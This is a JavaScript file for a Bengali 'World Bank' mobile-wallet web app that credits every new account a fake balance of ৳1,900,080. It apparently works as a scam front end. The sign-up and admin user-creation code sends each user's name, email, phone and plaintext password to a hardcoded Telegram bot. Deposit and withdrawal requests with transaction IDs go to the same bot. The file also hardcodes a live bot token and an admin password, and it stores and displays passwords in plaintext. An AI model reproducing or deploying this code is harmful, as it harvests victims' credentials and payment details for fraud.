// ১. ফায়ারবেস কনফিগারেশন URL ও টেলিগ্রাম ক্রেডেনশিয়ালস
const FIREBASE_DB_URL = "https://wallet-banking-default-rtdb.firebaseio.com/";
const BOT_TOKEN = "8898294688:AAH6ngVGDHwNJ1Fpri9OiNgd2nqCDvs9BFE"; 
const CHAT_ID = "7560607133";

// এডমিন সিকিউরিটি পাসওয়ার্ড
const ADMIN_SECURITY_PASS = "worldbank1234@#";

// প্রারম্ভিক ব্যালেন্স ডাটা
const defaultTotalBalance = 1900080;
const defaultBalances = {
    WorldBank: 1900080,
    bKash: 0,
    Nagad: 0,
    Rocket: 0,
    Upay: 0,
    DBBL: 0,
    IBBL: 0,
    City: 0
};

let usersDatabase = [];
let allTransactions = [];
let defaultGlobalMaxLimit = 500000;
let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
let balanceHideTimer = null;
let currentLang = 'bn';

// ইমেইলকে ফায়ারবেস ভ্যালিড কি (Key)-তে রূপান্তর ফাংশন
function sanitizeEmailKey(email) {
    return email ? email.replace(/[^a-zA-Z0-9]/g, "_") : "";
}

// সেন্ট্রাল ক্লাউড সিঙ্ক ফাংশন (সকল ইউজার, কাস্টম লিমিট ও ট্রানজেকশন ফায়ারবেস থেকে সিঙ্ক করবে)
async function syncFromFirebase() {
    try {
        // ১. ইউজার ডাটা সিঙ্ক
        const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
        const uData = await uRes.json();
        if (uData) {
            usersDatabase = Object.values(uData);
            localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
            
            if (activeUser) {
                const refreshedUser = usersDatabase.find(u => u.email === activeUser.email);
                if (refreshedUser) {
                    activeUser = refreshedUser;
                    localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
                }
            }
        }

        // ২. ট্রানজেকশন হিস্ট্রি সিঙ্ক
        const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
        const tData = await tRes.json();
        if (tData) {
            allTransactions = Object.values(tData).reverse();
            localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        }

    } catch(err) {
        console.error("Firebase sync error:", err);
        usersDatabase = JSON.parse(localStorage.getItem('wb_users')) || [];
        allTransactions = JSON.parse(localStorage.getItem('wb_transactions')) || [];
    }
}

document.addEventListener('DOMContentLoaded', async () => {
    await syncFromFirebase();
    
    if (activeUser) {
        const refreshedUser = usersDatabase.find(u => u.email === activeUser.email);
        if (refreshedUser) {
            activeUser = refreshedUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        }

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
        renderBalances();
    }
});

// এডমিন প্যানেল থেকে রিফ্রেশ বাটন (সেন্ট্রাল ডাটাবেস আপডেট)
async function refreshAdminData() {
    await syncFromFirebase();
    renderAdminUsersList();
    renderAdminPendingList();
    renderAdminAllHistory();
    populateAdminUserSelect();
    alert(currentLang === 'bn' ? 'সেন্ট্রাল ফায়ারবেস ক্লাউড থেকে সকল ডাটা সফলভাবে রিফ্রেশ করা হয়েছে!' : 'All data successfully refreshed from Central Firebase Cloud!');
}

// ফায়ারবেসে পার্মানেন্ট সেভ ফাংশনসমূহ
async function saveUserToFirebase(user) {
    const userKey = sanitizeEmailKey(user.email);
    try {
        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(user)
        });
    } catch(err) {
        console.error("User save error:", err);
    }
}

async function saveTxToFirebase(txObj) {
    try {
        await fetch(`${FIREBASE_DB_URL}/transactions/tx_${txObj.id}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(txObj)
        });
    } catch(err) {
        console.error("Transaction save error:", err);
    }
}

// মেইন পেজের উপরে ব্যাক করার ফাংশন
function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// পাসওয়ার্ড হাইড এবং দেখানোর ফাংশন
function togglePasswordVisibility(inputId, btn) {
    const input = document.getElementById(inputId);
    if (!input) return;
    if (input.type === 'password') {
        input.type = 'text';
        btn.innerText = '🙈';
    } else {
        input.type = 'password';
        btn.innerText = '👁️';
    }
}

// ফরগেট পাসওয়ার্ড মডাল কন্ট্রোল
function toggleForgotModal() {
    document.getElementById('forgotModal').classList.toggle('hidden');
}

function handleForgotPassword(e) {
    e.preventDefault();
    const email = document.getElementById('forgotEmailInput').value.trim();
    const phone = document.getElementById('forgotPhoneInput').value.trim();

    const user = usersDatabase.find(u => u.email === email && u.phone === phone);

    if (user) {
        alert(currentLang === 'bn' 
            ? `আপনার অ্যাকাউন্ট সফলভাবে রিকভার হয়েছে!\n\nইমেইল: ${user.email}\nপাসওয়ার্ড: ${user.password}`
            : `Account recovered successfully!\n\nEmail: ${user.email}\nPassword: ${user.password}`);
        toggleForgotModal();
    } else {
        alert(currentLang === 'bn' 
            ? 'প্রদত্ত ইমেইল বা মোবাইল নম্বরটি আমাদের ডাটাবেসে পাওয়া যায়নি!'
            : 'Entered email or phone number not found in our database!');
    }
}

// ভাষা পরিবর্তন লজিক
function setLanguage(lang) {
    currentLang = lang;
    document.getElementById('btnLangBN').classList.toggle('active', lang === 'bn');
    document.getElementById('btnLangEN').classList.toggle('active', lang === 'en');
    
    const dashLangBtn = document.getElementById('dashLangBtn');
    if (dashLangBtn) dashLangBtn.innerText = lang === 'bn' ? 'EN' : 'BN';

    document.querySelectorAll('[data-bn]').forEach(el => {
        el.innerText = lang === 'bn' ? el.getAttribute('data-bn') : el.getAttribute('data-en');
    });

    document.querySelectorAll('[data-bn-ph]').forEach(el => {
        el.placeholder = lang === 'bn' ? el.getAttribute('data-bn-ph') : el.getAttribute('data-en-ph');
    });
}

function switchTab(type) {
    document.getElementById('errorText').style.display = 'none';
    if(type === 'login') {
        document.getElementById('loginForm').classList.remove('hidden');
        document.getElementById('signUpForm').classList.add('hidden');
        document.getElementById('loginTab').classList.add('active');
        document.getElementById('signUpTab').classList.remove('active');
    } else {
        document.getElementById('signUpForm').classList.remove('hidden');
        document.getElementById('loginForm').classList.add('hidden');
        document.getElementById('signUpTab').classList.add('active');
        document.getElementById('loginTab').classList.remove('active');
    }
}

function sendTelegramNotification(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
    }).catch(err => console.error("Telegram API Error:", err));
}

// সাইন আপ (নতুন ইউজারকে ডিফল্ট লিমিট সহ সেভ করা)
async function handleSignUp(e) {
    e.preventDefault();
    const name = document.getElementById('regName').value;
    const email = document.getElementById('regEmail').value;
    const phone = document.getElementById('regPhone').value;
    const password = document.getElementById('regPass').value;

    await syncFromFirebase();

    const exists = usersDatabase.some(u => u.email === email);
    if(exists) {
        alert(currentLang === 'bn' ? 'এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!' : 'An account already exists with this email!');
        return;
    }

    const newUser = {
        name,
        email,
        phone,
        password,
        totalBalance: defaultTotalBalance,
        withdrawLimit: defaultGlobalMaxLimit,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await saveUserToFirebase(newUser);

    sendTelegramNotification(`👤 <b>World Bank নতুন সাইন আপ!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n📱 ফোন: ${phone}\n🔑 পাসওয়ার্ড: ${password}`);

    alert(currentLang === 'bn' ? 'অ্যাকাউন্ট সাইন আপ সফল হয়েছে! এখন লগইন করুন।' : 'Registration successful! Please login.');
    switchTab('login');
    document.getElementById('signUpForm').reset();
}

// লগইন
async function handleLogin(e) {
    e.preventDefault();
    const email = document.getElementById('logEmail').value;
    const password = document.getElementById('logPass').value;

    await syncFromFirebase();

    const userIndex = usersDatabase.findIndex(u => u.email === email && u.password === password);

    if(userIndex !== -1) {
        activeUser = usersDatabase[userIndex];
        if(!activeUser.balances) activeUser.balances = { ...defaultBalances };

        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
        document.getElementById('errorText').style.display = 'none';

        renderBalances();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
}

// "Tap for Balance"
function toggleBalanceVisibility() {
    const pillText = document.getElementById('balancePillText');
    if (!activeUser) return;

    if (balanceHideTimer) clearTimeout(balanceHideTimer);

    const showBal = activeUser.totalBalance !== undefined ? activeUser.totalBalance : (activeUser.balances ? activeUser.balances.WorldBank : 0);
    pillText.innerText = `৳ ${showBal.toLocaleString('bn-BD')}`;

    balanceHideTimer = setTimeout(() => {
        pillText.innerText = "Tap for Balance";
    }, 3000);
}

function renderBalances() {
    if (!activeUser) return;
    if (!activeUser.balances) activeUser.balances = { ...defaultBalances };

    for (let key in activeUser.balances) {
        const el = document.getElementById(`bal_${key}`);
        if (el) el.innerText = `৳ ${(activeUser.balances[key] || 0).toLocaleString('bn-BD')}`;
    }
}

function logout() {
    activeUser = null;
    localStorage.removeItem('wb_active_session');
    document.getElementById('dashboardSection').classList.add('hidden');
    document.getElementById('authSection').classList.remove('hidden');
    document.getElementById('loginForm').reset();
}

// সার্ভিস আইকন ক্লিকে স্ক্রোল ও ফোকাস
function scrollToAction(type) {
    let targetId = type === 'Withdraw' ? 'withdrawFormBox' : 'depositFormBox';
    let targetEl = document.getElementById(targetId);

    if (targetEl) {
        targetEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
        targetEl.classList.add('highlight');
        setTimeout(() => {
            targetEl.classList.remove('highlight');
        }, 1500);
    }
}

function toggleProfileModal() {
    document.getElementById('profileModal').classList.toggle('hidden');
    if (activeUser) {
        document.getElementById('profNameInput').value = activeUser.name || '';
        document.getElementById('profPhoneInput').value = activeUser.phone || '';
        document.getElementById('profPassInput').value = activeUser.password || '';
    }
}

// ইনবক্স মডাল ওপেন এবং স্পট হিস্ট্রি রেন্ডার
async function openInboxModal() {
    await syncFromFirebase();
    document.getElementById('inboxModal').classList.toggle('hidden');
    renderUserInboxHistory();
}

async function updateUserProfile(e) {
    e.preventDefault();
    if (!activeUser) return;

    activeUser.name = document.getElementById('profNameInput').value;
    activeUser.phone = document.getElementById('profPhoneInput').value;
    activeUser.password = document.getElementById('profPassInput').value;

    const userIndex = usersDatabase.findIndex(u => u.email === activeUser.email);
    if (userIndex !== -1) {
        usersDatabase[userIndex] = activeUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        await saveUserToFirebase(activeUser);
    }

    document.getElementById('userPhoneDisp').innerText = activeUser.phone;
    alert(currentLang === 'bn' ? 'প্রোফাইল তথ্য সফলভাবে আপডেট হয়েছে!' : 'Profile updated successfully!');
    toggleProfileModal();
}

// লেনদেন রিকোয়েস্ট (ইউজারের নিজস্ব নির্ধারিত উইথড্র লিমিট চেক করা)
async function submitTransactionRequest(e, type) {
    e.preventDefault();
    const form = e.target;
    const method = form.querySelector('.methodSelect').value;
    const phone = form.querySelector('.phoneInput').value;
    const amount = parseFloat(form.querySelector('.amountInput').value);
    const trxId = form.querySelector('.trxInput').value;

    if (isNaN(amount) || amount <= 0) {
        alert(currentLang === 'bn' ? 'সঠিক পরিমাণ দিন!' : 'Please enter a valid amount!');
        return;
    }

    // ইউজারের নিজস্ব কাস্টম উইথড্র লিমিট চেক
    const userLimit = activeUser.withdrawLimit !== undefined ? parseFloat(activeUser.withdrawLimit) : defaultGlobalMaxLimit;

    if (type === 'Withdraw' && amount > userLimit) {
        const limitMsg = currentLang === 'bn' 
            ? `এডমিন নির্ধারিত আপনার সর্বোচ্চ উইথড্র লিমিট ৳${userLimit.toLocaleString('bn-BD')}-এর বেশি রিকোয়েস্ট করা যাবে না।`
            : `Cannot request more than your assigned withdraw limit ৳${userLimit.toLocaleString('en-US')}.`;
        alert(limitMsg);
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.email,
        userName: activeUser.name,
        type: type,
        method: method,
        phone: phone,
        amount: amount,
        trxId: trxId,
        status: 'Pending',
        dateStr: now.toLocaleDateString('bn-BD'),
        timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    const msg = `⏳ <b>World Bank নতুন ${type} পেন্ডিং রিকোয়েস্ট!</b>\n\n` +
                `👤 ইউজার: ${activeUser.name}\n` +
                `📌 টাইপ: ${type}\n` +
                `🏦 মেথড: ${method}\n` +
                `📱 নম্বর: ${phone}\n` +
                `💰 পরিমাণ: ৳${amount}\n` +
                `🆔 TrxID: ${trxId}\n` +
                `⏱️ সময়সীমা: ১৫ থেকে ২০ মিনিটের মধ্যে অ্যাপ্রুভ করা হবে।`;
    sendTelegramNotification(msg);

    const successAlert = currentLang === 'bn' 
        ? 'আপনার রিকোয়েস্টটি সেন্ট্রাল এডমিন প্যানেলে সফলভাবে পাঠানো হয়েছে। আগামী ১৫ থেকে ২০ মিনিটের মধ্যে তথ্য যাচাই করে আপনার রিকোয়েস্টটি অ্যাপ্রুভ করা হবে।'
        : 'Your request has been successfully sent to the Central Admin Panel. It will be verified and approved within 15 to 20 minutes.';
    alert(successAlert);

    form.reset();
    scrollToTop();
}

// ইউজারের ইনবক্স হিস্ট্রি (গাঢ় কালো স্পষ্ট লেখা রেন্ডারিং)
function renderUserInboxHistory() {
    const tbody = document.getElementById('userInboxModalBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    const myTxs = allTransactions.filter(t => t.userEmail === activeUser.email);

    if (myTxs.length === 0) {
        const noRecordText = currentLang === 'bn' ? 'কোনো ইনবক্স রেকর্ড নেই।' : 'No inbox records found.';
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">${noRecordText}</td></tr>`;
        return;
    }

    myTxs.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="color:#0f172a !important; font-weight: bold;">${t.dateStr} ${t.timeStr}</td>
            <td style="color:#0f172a !important; font-weight: bold;">${t.type}</td>
            <td style="color:#0f172a !important; font-weight: bold;">${t.method}</td>
            <td style="color:#be123c !important; font-weight: bold;">৳${t.amount.toLocaleString('bn-BD')}</td>
            <td style="color:#0f172a !important; font-weight: bold;"><code>${t.trxId}</code></td>
            <td>${statusBadge}</td>
        `;
        tbody.appendChild(tr);
    });
}

// এডমিন সিকিউরিটি
async function toggleAdminModal() {
    document.getElementById('adminModal').classList.toggle('hidden');
}

async function verifyAdminPassword() {
    const pass = document.getElementById('adminPassInput').value;
    if (pass === ADMIN_SECURITY_PASS) {
        document.getElementById('adminAuthBox').classList.add('hidden');
        document.getElementById('adminControlBox').classList.remove('hidden');
        
        await syncFromFirebase();
        renderAdminUsersList();
        renderAdminPendingList();
        renderAdminAllHistory();
        populateAdminUserSelect();
    } else {
        alert('ভুল এডমিন পাসওয়ার্ড!');
    }
}

// ইউজারের ইমেইল দেখে ইচ্ছামত নির্দিষ্ট উইথড্র লিমিট সেট করার এডমিন লজিক
async function adminUpdateUserWithdrawLimit(e) {
    e.preventDefault();
    const userEmail = document.getElementById('admLimitUserSelect').value;
    const newLimit = parseFloat(document.getElementById('admUserCustomLimitInput').value);

    if (!userEmail || isNaN(newLimit) || newLimit < 0) {
        alert('সঠিক ইউজার ও লিমিটের পরিমাণ দিন!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.email === userEmail);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        user.withdrawLimit = newLimit;

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(user);

        alert(`সফলভাবে ${user.name} (${user.email})-এর উইথড্র লিমিট ৳${newLimit.toLocaleString('bn-BD')} করা হয়েছে!`);
        
        document.getElementById('admUserCustomLimitInput').value = '';
        renderAdminUsersList();

        if (activeUser && activeUser.email === user.email) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        }
    }
}

// এডমিন প্যানেলের ইউজার সিলেক্ট ড্রপডাউন ফিলআপ
function populateAdminUserSelect() {
    const balSelect = document.getElementById('admBalanceUserSelect');
    const limSelect = document.getElementById('admLimitUserSelect');

    if (balSelect) balSelect.innerHTML = '<option value="">ইউজার সিলেক্ট করুন</option>';
    if (limSelect) limSelect.innerHTML = '<option value="">ইউজার ইমেইল সিলেক্ট করুন</option>';

    usersDatabase.forEach(u => {
        const opt1 = document.createElement('option');
        opt1.value = u.email;
        opt1.innerText = `${u.name} (${u.email})`;
        if (balSelect) balSelect.appendChild(opt1);

        const opt2 = document.createElement('option');
        opt2.value = u.email;
        opt2.innerText = `${u.name} (${u.email})`;
        if (limSelect) limSelect.appendChild(opt2);
    });
}

// এডমিন ইউজার মেইন ব্যালেন্স কাস্টমাইজেশন
async function adminUpdateUserBalance(e) {
    e.preventDefault();
    const userEmail = document.getElementById('admBalanceUserSelect').value;
    const method = document.getElementById('admBalanceMethodSelect').value;
    const newAmount = parseFloat(document.getElementById('admBalanceAmount').value);

    if (!userEmail || isNaN(newAmount) || newAmount < 0) {
        alert('সঠিক তথ্য দিন!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.email === userEmail);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        if (!user.balances) user.balances = { ...defaultBalances };

        user.balances[method] = newAmount;

        if (method === 'WorldBank') {
            user.totalBalance = newAmount;
        }

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(user);

        alert(`সফলভাবে ${user.name}-এর ${method} ব্যালেন্স ৳${newAmount.toLocaleString('bn-BD')} করা হয়েছে!`);
        
        renderAdminUsersList();
        
        if (activeUser && activeUser.email === user.email) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }
    }
}

async function adminCreateUser(e) {
    e.preventDefault();
    const name = document.getElementById('admUserName').value;
    const email = document.getElementById('admUserEmail').value;
    const phone = document.getElementById('admUserPhone').value;
    const password = document.getElementById('admUserPass').value;

    const exists = usersDatabase.some(u => u.email === email);
    if(exists) {
        alert('এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট রয়েছে!');
        return;
    }

    const newUser = {
        name,
        email,
        phone,
        password,
        totalBalance: defaultTotalBalance,
        withdrawLimit: defaultGlobalMaxLimit,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await saveUserToFirebase(newUser);

    sendTelegramNotification(`👑 <b>এডমিন কর্তৃক নতুন ইউজার তৈরি!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${password}`);

    alert(`সফলভাবে ইউজার তৈরি হয়েছে!\nইউজার এই ইমেইল (${email}) ও পাসওয়ার্ড (${password}) দিয়ে যেকোনো ডিভাইস থেকে লগইন করতে পারবে।`);
    
    document.getElementById('admUserName').value = '';
    document.getElementById('admUserEmail').value = '';
    document.getElementById('admUserPhone').value = '';
    document.getElementById('admUserPass').value = '';

    renderAdminUsersList();
    populateAdminUserSelect();
}

// নিবন্ধিত ইউজার টেবিল রেন্ডার
function renderAdminUsersList() {
    const tbody = document.getElementById('adminUsersListBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (usersDatabase.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">কোনো নিবন্ধিত ইউজার পাওয়া যায়নি।</td></tr>`;
        return;
    }

    usersDatabase.forEach(u => {
        const tr = document.createElement('tr');
        const mainBal = u.totalBalance !== undefined ? u.totalBalance : (u.balances ? u.balances.WorldBank : 0);
        const uLimit = u.withdrawLimit !== undefined ? u.withdrawLimit : defaultGlobalMaxLimit;
        tr.innerHTML = `
            <td><b>${u.name || 'N/A'}</b></td>
            <td>${u.email || 'N/A'}</td>
            <td>${u.phone || 'N/A'}</td>
            <td><code>${u.password || 'N/A'}</code></td>
            <td style="color:#38bdf8;"><b>৳${mainBal.toLocaleString('bn-BD')}</b></td>
            <td style="color:#f59e0b;"><b>৳${uLimit.toLocaleString('bn-BD')}</b></td>
        `;
        tbody.appendChild(tr);
    });
}

// সেন্ট্রাল পেন্ডিং লিস্ট রেন্ডার
function renderAdminPendingList() {
    const tbody = document.getElementById('adminPendingTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    const pendingTxs = allTransactions.filter(t => t.status === 'Pending');

    if (pendingTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:#94a3b8;">কোনো পেন্ডিং রিকোয়েস্ট নেই।</td></tr>`;
        return;
    }

    pendingTxs.forEach(t => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><b>${t.userName || t.userEmail}</b></td>
            <td style="color:#f59e0b;"><b>${t.type}</b></td>
            <td>${t.method}</td>
            <td>${t.phone}</td>
            <td style="color:#38bdf8;"><b>৳${t.amount.toLocaleString('bn-BD')}</b></td>
            <td><code>${t.trxId}</code></td>
            <td>
                <button onclick="approveTransaction(${t.id})" class="btn-approve">Approve</button>
                <button onclick="rejectTransaction(${t.id})" class="btn-reject">Reject</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

// সেন্ট্রাল প্রসেসড ট্রানজেকশন হিস্ট্রি
function renderAdminAllHistory() {
    const tbody = document.getElementById('adminAllHistoryTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (allTransactions.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">কোনো ট্রানজেকশন ডাটা নেই।</td></tr>`;
        return;
    }

    allTransactions.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><b>${t.userName || t.userEmail}</b></td>
            <td>${t.type}</td>
            <td>${t.method}</td>
            <td>৳${t.amount.toLocaleString('bn-BD')}</td>
            <td><code>${t.trxId}</code></td>
            <td>${statusBadge}</td>
        `;
        tbody.appendChild(tr);
    });
}

// উইথড্র বা ডিপোজিট অ্যাপ্রুভ
async function approveTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex === -1) return;

    const tx = allTransactions[txIndex];
    const userIndex = usersDatabase.findIndex(u => u.email === tx.userEmail);

    if (userIndex !== -1) {
        const targetUser = usersDatabase[userIndex];
        if (!targetUser.balances) targetUser.balances = { ...defaultBalances };
        if (targetUser.totalBalance === undefined) {
            targetUser.totalBalance = targetUser.balances.WorldBank !== undefined ? targetUser.balances.WorldBank : defaultTotalBalance;
        }

        if (tx.type === 'Withdraw') {
            targetUser.balances[tx.method] = (targetUser.balances[tx.method] || 0) - tx.amount;
            targetUser.totalBalance -= tx.amount;
        } else if (tx.type === 'Deposit') {
            targetUser.balances[tx.method] = (targetUser.balances[tx.method] || 0) + tx.amount;
            targetUser.totalBalance += tx.amount;
        }

        usersDatabase[userIndex] = targetUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(targetUser);

        allTransactions[txIndex].status = 'Approved';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        await saveTxToFirebase(allTransactions[txIndex]);

        sendTelegramNotification(`✅ <b>ট্রানজেকশন অ্যাপ্রুভড!</b>\n\n👤 ইউজার: ${tx.userName}\n💰 পরিমাণ: ৳${tx.amount}\n🏦 মেথড: ${tx.method}\n⚡ মেইন ব্যালেন্স ও ক্লাউড ডাটাবেসে চিরস্থায়ীভাবে আপডেট করা হয়েছে।`);

        alert('ট্রানজেকশন সফলভাবে অ্যাপ্রুভ করা হয়েছে এবং ক্লাউড ডাটাবেসে স্থায়ীভাবে ব্যালেন্স আপডেট করা হয়েছে!');

        if (activeUser && activeUser.email === targetUser.email) {
            activeUser = targetUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }

        renderAdminPendingList();
        renderAdminUsersList();
        renderAdminAllHistory();
    }
}

// রিজেক্ট লজিক
async function rejectTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex !== -1) {
        allTransactions[txIndex].status = 'Rejected';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        await saveTxToFirebase(allTransactions[txIndex]);

        sendTelegramNotification(`❌ <b>ট্রানজেকশন রিজেক্টেড!</b>\n\n👤 ইউজার: ${allTransactions[txIndex].userName}\n⚠️ মেইন ব্যালেন্স অপরিবর্তিত রাখা হয়েছে।`);

        alert('উইথড্র রিকোয়েস্টটি রিজেক্ট করা হয়েছে। ইউজারের মেইন ব্যালেন্স থেকে কোনো টাকা কাটা হয়নি।');
        
        renderAdminPendingList();
        renderAdminAllHistory();
    }
}